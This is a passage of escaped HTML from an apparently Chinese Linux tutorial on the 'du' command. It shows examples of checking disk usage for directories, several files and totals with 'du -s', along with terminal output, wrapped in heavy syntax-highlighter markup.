&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09782426177068-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09782426177068-19&quot;&gt;19&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;lib&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;product&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;info&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;      &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;deploy&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-11&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;      &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;service&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-13&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;doc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-15&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-17&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;      &lt;span class=&quot;crayon-i&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09782426177068-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09782426177068-19&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0020 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例4：显示多个文件所占空间&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09785926093191&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du log30.tar.gz log31.tar.gz&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09785926093191-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09785926093191-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log30&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log31&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09788908535706&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du log30.tar.gz log31.tar.gz 

4       log30.tar.gz

4       log31.tar.gz

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09788908535706-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09788908535706-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09788908535706-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09788908535706-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09788908535706-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09788908535706-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09788908535706-7&quot;&gt;7&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09788908535706-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du log30.tar.gz log31.tar.gz &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09788908535706-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09788908535706-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;log30&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09788908535706-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09788908535706-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;log31&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09788908535706-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09788908535706-7&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0010 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例5：只显示总和的大小&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed0978b169766789&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du -s&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978b169766789-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978b169766789-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;s&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0003 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed0978e618136906&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du -s

1288    .

[root@localhost test]# du -s scf

32      scf

[root@localhost test]# cd ..

[root@localhost soft]# du -s test

1288    test

[root@localhost soft]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0978e618136906-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0978e618136906-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0978e618136906-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0978e618136906-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0978e618136906-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0978e618136906-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0978e618136906-14&quot;&gt;14&lt;/div&gt;
